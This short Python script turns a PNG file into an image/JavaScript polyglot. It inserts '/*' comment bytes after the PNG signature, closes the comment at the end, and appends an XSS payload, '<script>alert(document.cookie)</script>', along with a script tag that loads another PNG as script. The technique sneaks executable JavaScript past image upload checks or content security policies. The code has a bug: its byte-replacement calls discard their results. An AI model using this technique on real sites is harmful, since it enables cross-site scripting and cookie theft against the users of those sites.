
#replace '*' and '/'
file_name="cloud.png"

png_binary=open(file_name, "r+b")
buff=png_binary.read()
buff.replace(b'\x2A',B'\x00')
buff.replace(b'\x2F',B'\x00')
png_binary.close()

png_binary=open(file_name, "w+b")
png_binary.write(buff)
png_binary.seek(8, 0)
png_binary.write(b'\xFF\x2F\x2A')
png_binary.close()

png_binary=open(file_name, "a+b")
png_binary.write(b"\x2A\x2F")
png_binary.close()

png_binary=open(file_name, "a")
png_binary.write("<script>alert(document.cookie)</script>")
png_binary.close()

png_binary=open(file_name, "a")
png_binary.write("<script src='cloud_test2.png'></script>")
png_binary.close()
